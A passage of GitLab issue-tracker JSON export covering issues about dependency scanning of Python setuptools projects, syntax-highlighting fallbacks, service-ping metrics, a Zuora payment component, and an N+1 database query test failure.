Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358821","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358821","notes":"https://gitlab.com/api/v4/projects/278964/issues/358821/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358821/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358821","relative":"#358821","full":"gitlab-org/gitlab#358821"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6351,"epic":{"id":307776,"iid":6351,"title":"Framework for source code rules","url":"/groups/gitlab-org/-/epics/6351","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":106527580,"iid":358800,"project_id":278964,"title":"Dependency scanning fails for setuptools project that includes pyproject.toml","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nPython projects that use `setuptools` for metadata (i.e. have a `setup.cfg` or `setup.py` file) but _also_ include a `pyproject.toml` file cannot be scanned properly by the [dependency scanning](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/) template.\n\nNote that including a `pyproject.toml` file to declare the `build-system` is the [recommended way to configure a project for setuptools](https://setuptools.pypa.io/en/latest/userguide/quickstart.html#basic-use).\n\n### Steps to reproduce\n\nConfigure a project with the following files:\n\n\u003cdetails\u003e\n\u003csummary\u003epyproject.toml\u003c/summary\u003e\n\n```toml\n[build-system]\nrequires = [\n    \"setuptools\u003e=42\",\n    \"wheel\",\n]\nbuild-backend = \"setuptools.build_meta\"\n```\n\u003c/details\u003e\n\u003cdetails\u003e\n\u003csummary\u003esetup.py\u003c/summary\u003e\n\n```python\nfrom setuptools import setup\nsetup(\n    name=\"testproject\",\n    version=\"0.0.1\",\n    install_requires=[\"coloredlogs\"],\n)\n```\n\u003c/details\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003e.gitlab-ci.yml\u003c/summary\u003e\n\n```yaml\ninclude:\n  # https://docs.gitlab.com/ee/user/application_security/dependency_scanning/\n  - template: Jobs/Dependency-Scanning.gitlab-ci.yml\n\ndependency_scanning:\n  variables:\n    SECURE_LOG_LEVEL: \"debug\"\n```\n\n\u003c/details\u003e\n\n### Example Project\n\nhttps://gitlab.com/duncanmmacleod/dependency-scanning-test/-/tree/setup.py\n\n### What is the current *bug* behavior?\n\n`gemnasium-python` see `pyproject.toml` and presumes the project is a poetry project, and ignores the `setup.py` file.\n\n### What is the expected *correct* behavior?\n\nSince `pyproject.toml` is independent of the build infrastructure it should be selected _after_ `setup.{cfg,py}`, probably last except for `requirements.txt`.\n\nOr, the scanner should read the `pyproject.toml` file and use the `[build-system]/build-backend` option to determine the package manager.\n\n### Relevant logs and/or screenshots\n\nFrom https://gitlab.com/duncanmmacleod/dependency-scanning-test/-/jobs/2325799205:\n\n```\n$ /analyzer run\n[INFO] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ GitLab gemnasium-python analyzer v2.22.0\n[DEBU] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ inspect directory: .\n[DEBU] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ skip ignored directory: .git\n[DEBU] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ electing poetry for pypi because this is the first match\n[DEBU] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ rejecting setup.py as handled by setuptools\n[DEBU] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ electing poetry for pypi because this is the first match\n[DEBU] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ rejecting setup.py as handled by setuptools\n[INFO] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ Detected supported dependency files in '.'. Dependency files detected in this directory will be processed. Dependency files in other directories will be skipped.\n[DEBU] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ Exporting dependencies for /builds/duncanmmacleod/dependency-scanning-test/pyproject.toml\n[ERRO] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ No builder for package manager poetry\n[FATA] [gemnasium-python] [2022-04-12T12:57:35Z] â–¶ no builder for requirements file\n```\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n### Possible fixes\n\n`pyproject.toml` is no longer specific to Poetry, so it should be removed from the definition of `PackageManagerPoetry`.\n\n```go\n\t// PackageManagerPoetry describes Poetry (Python)\n\tPackageManagerPoetry = PackageManager{\n\t\tName:        \"poetry\",\n\t\tPackageType: PackageTypePypi,\n\t\tFiles: []File{\n\t\t\t{Filename: \"pyproject.toml\", FileType: FileTypeRequirements},\n\t\t\t{Filename: \"poetry.lock\", FileType: FileTypeLockFile},\n\t\t},\n\t}\n```\n\nSee https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/4785f7789e1ab41948b2c1ed786e6b9469fff12e/finder/package_manager.go#L196\n\n### Implementation plan\n\nUpdate gemnasium-python:\n- Remove `pyproject.toml` from `PackageManagerPoetry`.\n- Add an integration test for the case where a setuptool project has `setup.py` and `pyproject.toml`.\n- Release a new version.","state":"closed","created_at":"2022-04-12T13:10:34.263Z","updated_at":"2022-06-22T16:31:22.947Z","closed_at":"2022-05-09T18:21:59.082Z","closed_by":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"labels":["Category:Dependency Scanning","Enterprise Edition","GitLab Ultimate","backend","devops::secure","group::composition analysis","priority::2","section::sec","severity::2","type::bug","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":11279441,"username":"hacks4oats","name":"Oscar Tovar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11279441/avatar.png","web_url":"https://gitlab.com/hacks4oats"}],"author":{"id":1965376,"username":"duncanmmacleod","name":"Duncan Macleod","state":"active","avatar_url":"https://secure.gravatar.com/avatar/908e4540ff5f9fe2f2a71380302cfe55?s=80\u0026d=identicon","web_url":"https://gitlab.com/duncanmmacleod"},"type":"ISSUE","assignee":{"id":11279441,"username":"hacks4oats","name":"Oscar Tovar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11279441/avatar.png","web_url":"https://gitlab.com/hacks4oats"},"user_notes_count":23,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358800","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358800","notes":"https://gitlab.com/api/v4/projects/278964/issues/358800/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358800/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358800","relative":"#358800","full":"gitlab-org/gitlab#358800"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":1400,"epic":{"id":7868,"iid":1400,"title":"Improve Dependency Scanning support for Python","url":"/groups/gitlab-org/-/epics/1400","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106520621,"iid":358793,"project_id":278964,"title":"Spike: test the plugin architecture to add links to ONE type of package manager file (with implementation)","description":"As part of linking dependency files to their respective package managers, we should see how feasible it is to use the plugin API of Highlight.js to generate links for dependencies.\n\nThis issue is a spike to use the plugin API and generating links for one type of package manager file (e.g. package.json)","state":"closed","created_at":"2022-04-12T11:42:55.012Z","updated_at":"2022-07-21T12:01:10.088Z","closed_at":"2022-07-14T07:13:25.998Z","closed_by":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"labels":["Category:Source Code Management","Deliverable","auto updated","devops::create","frontend","group::source code","missed-deliverable","missed:15.1","quad-planning::complete-no-action","section::dev","workflow::verification"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"}],"author":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"type":"ISSUE","assignee":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358793","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358793","notes":"https://gitlab.com/api/v4/projects/278964/issues/358793/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358793/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358793","relative":"#358793","full":"gitlab-org/gitlab#358793"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7888,"epic":{"id":497868,"iid":7888,"title":"Link to package managers when viewing dependency files with highlight.js","url":"/groups/gitlab-org/-/epics/7888","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106520378,"iid":358792,"project_id":278964,"title":"Fallback to backend rendered syntax highlighting when viewing dependency files","description":"As part of [Highlighting source code on the frontend using Highlight.js](https://gitlab.com/groups/gitlab-org/-/epics/7146) we should ensure that package names are linked to their respective package managers when viewing dependency files.\n\nThis issue proposes a fallback approach by requesting the legacy (backend rendered) files instead of using highlight.js when viewing dependency files. This is an interim solution in order to unblock the rollout of highlighting syntax with highlight.js.\n\nDependency files that should fallback:\n\n* Gemfile\n* Gemspec\n* PackageJson\n* ComposerJson\n* Podfile\n* Podspec\n* PodspecJson\n* Cartfile\n* GodepsJson\n* RequirementsTxt\n* CargoToml\n* GoMod\n* GoSum","state":"closed","created_at":"2022-04-12T11:37:48.251Z","updated_at":"2022-05-24T12:00:05.789Z","closed_at":"2022-04-26T06:18:08.969Z","closed_by":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"labels":["Category:Source Code Management","Deliverable","auto updated","devops::create","frontend","group::source code","section::dev","type::feature","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"}],"author":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"type":"ISSUE","assignee":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358792","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358792","notes":"https://gitlab.com/api/v4/projects/278964/issues/358792/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358792/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358792","relative":"#358792","full":"gitlab-org/gitlab#358792"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7146,"epic":{"id":387817,"iid":7146,"title":"Highlight source code syntax on the frontend using HighlightJS","url":"/groups/gitlab-org/-/epics/7146","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106517547,"iid":358786,"project_id":278964,"title":"Fix Service ping failing metrics for ecosystem stage (2)","description":"## Summary\n\nThe following metrics are failing in GitLab.com for ~\"devops::ecosystem\" \n\n- [`counts.groups_inheriting_github_active`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/config/metrics/counts_all/20210216175857_groups_inheriting_github_active.yml)\n- [`counts.groups_flowdock_active`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/config/metrics/counts_all/20210216175839_groups_flowdock_active.yml)\n- \n## Resources\n\n* See [Service ping guide for how to optimize queries](https://docs.gitlab.com/ee/development/service_ping/implement.html#optimize-queries-with-database-lab)\n* Use [Metrics dictionary ](https://metrics.gitlab.com/)to find more information about metrics","state":"closed","created_at":"2022-04-12T10:46:29.919Z","updated_at":"2022-12-05T12:02:54.036Z","closed_at":"2022-08-09T11:54:43.389Z","closed_by":{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"},"labels":["auto updated","backend","broken metric","devops::manage","group::integrations","product intelligence","section::dev","type::bug","workflow::production"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"}],"author":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"MikoÅ‚aj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"type":"ISSUE","assignee":{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358786","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358786","notes":"https://gitlab.com/api/v4/projects/278964/issues/358786/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358786/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358786","relative":"#358786","full":"gitlab-org/gitlab#358786"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":9402,"epic":{"id":672526,"iid":9402,"title":"Fix service ping failing metrics for Integrations","url":"/groups/gitlab-org/-/epics/9402","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106513990,"iid":358782,"project_id":278964,"title":"Zuora Simple Component: implement events API","description":"A new component for Zuora was introduced with gitlab-org/gitlab!84342. The idea is to harmonise all the usages (i.e. replace all implementations with this new component).\n\nIn order to make the transition easier, we should first address how the component API will act on error cases (e.g. which events to emit, under which conditions, etc). This is especially important because most implementations are using an external button that needs to be disabled when certain (error) states occur. Additionally, some of the requests will need to go up and therefore rely on event communication.\n\nWhile here, we can cover also some non-error states.\n\n### Implementation (proposal)\n\nThese events should be emitted when the described state obtains.\n\n##### Error states\n\n| Zuora Simple error state | Event to emit\n|-|-|\n| iFrame did not load/render | `loaded-error` |\n| Validation error: client | `client-validation-error` |\n| Validation error: server | `server-validation-error` |\n| Payment submit error | `payment-submit-error` |\n\n##### Success states\n\n| Zuora Simple state | Event to emit |\n|-|-|\n| iFrame did load/render | `loaded` |\n| Payment submit success | `success` |\n\nAdditional:\n\n1. an `enum`-like structure (already [here](https://gitlab.com/gitlab-org/gitlab/-/blob/1e54acf4e5349639f5ca65cf172ff88b1bc49d8c/ee/app/assets/javascripts/billings/components/zuora_simple.vue#L29)) for the values of the event can be created. It makes dispatching/listening more consistent\n1. make sure to test the events are correctly emitted\n\n#### How to get ZuoraSimple\n\nThis requires _both_ `gdk` and CustomersDot running.\n\n* Setup the HPM in Zuora Api Sandbox, you have two ways:\n  1. create an HPM similar to this: https://apisandbox.zuora.com/apps/HostedPageLite.do?method=preview\u0026id=8ad099157fd495bf017fdadbab7e6959:\n      - set the as name `GL.com Credit Card Validation_\u003cyour-name\u003e` (e.g. `GL.com Credit Card Validation_agulina`)\n      - for URL/host, use your `gdk` host\n  1. just use mine :innocent: (but please, **do not** change the configurations, it assumes you run `gdk` on `http://localhost:3000`)\n* copy the `id` of the page (mine is `8ad099157fd495bf017fdadbab7e6959`)\n* go to `secrets.yml` in CustomersDot and use it for `zuora_payment_method_validation_page_id` in `development` settings (if not there, add it manually)\n* (restart CustomersDot)\n* in your terminal, export `GITLAB_SIMULATE_SAAS=true` (if `gdk` is already running, do a `gdk restart`)\n* go to the `gdk` rails console and type `Feature.enable(:ci_require_credit_card_on_free_plan)`\n\nNext, steps to see the feature:\n\n* Create a new User on your `gdk`. You can add it by visiting `/admin/users/` and logging in with your `root`. The user **should not** be ad admin\n* Log in with the new user\n* Create a group and a project\n* In the repository of the project, create a `.gitlab-ci.yml` file (you can select whatever template)\n* Visit `/-/pipelines/new` under your project\n* Click on `Run pipeline`\n* An alert should appear, click on `Validate account`\n* To use the form under `ZuoraSimple`, go to the `gdk` rails console and type `Feature.enable(:use_api_for_payment_validation)`\n* (refresh the page)","state":"closed","created_at":"2022-04-12T09:46:40.939Z","updated_at":"2022-11-22T02:42:08.554Z","closed_at":"2022-05-10T05:49:02.834Z","closed_by":{"id":10590518,"username":"snachnolkar","name":"Sharmad Nachnolkar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10590518/avatar.png","web_url":"https://gitlab.com/snachnolkar"},"labels":["Category:Purchase","devops::fulfillment","feature::enhancement","frontend","group::purchase","section::fulfillment","type::feature","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":10590518,"username":"snachnolkar","name":"Sharmad Nachnolkar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10590518/avatar.png","web_url":"https://gitlab.com/snachnolkar"}],"author":{"id":6348276,"username":"agulina","name":"Angelo Gulina","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b28693a558066993ea93b7272208d285?s=80\u0026d=identicon","web_url":"https://gitlab.com/agulina"},"type":"ISSUE","assignee":{"id":10590518,"username":"snachnolkar","name":"Sharmad Nachnolkar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10590518/avatar.png","web_url":"https://gitlab.com/snachnolkar"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358782","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358782","notes":"https://gitlab.com/api/v4/projects/278964/issues/358782/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358782/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358782","relative":"#358782","full":"gitlab-org/gitlab#358782"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106510680,"iid":358780,"project_id":278964,"title":"Multiple stop actions for an environment introduces N+1 DB queries in Environment serializer","description":"Multi stop_action for an environment feature implemented in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84922/ introduces N+1 database queries in Environment Serializer.\n\nRelated discussion from review https://gitlab.com/gitlab-org/gitlab/-/merge_requests/83024#note_904048370\n\n```txt\n\n  1) EE::EnvironmentSerializer behaves like avoid N+1 on environments serialization avoids N+1 database queries with grouping\n     Failure/Error: expect { serialize(grouping: true) }.not_to exceed_query_limit(control.count)\n\n       Expected a maximum of 68 queries, got 82:\n\n       SELECT COUNT(*) AS count_all, COALESCE(environment_type, name) AS coalesce_environment_type_name FROM \"environments\" WHERE \"environments\".\"project_id\" = 371 GROUP BY COALESCE(environment_type, name) LIMIT 10001 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT COALESCE(environment_type, name) AS folder, COUNT(*) AS size, MAX(id) AS last_id FROM \"environments\" WHERE \"environments\".\"project_id\" = 371 GROUP BY COALESCE(environment_type, name) ORDER BY folder ASC LIMIT 20 OFFSET 0 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"environments\".* FROM \"environments\" WHERE \"environments\".\"project_id\" = 371 AND \"environments\".\"id\" IN (395, 396, 397) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"project_features\".* FROM \"project_features\" WHERE \"project_features\".\"project_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Project' AND \"routes\".\"source_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" 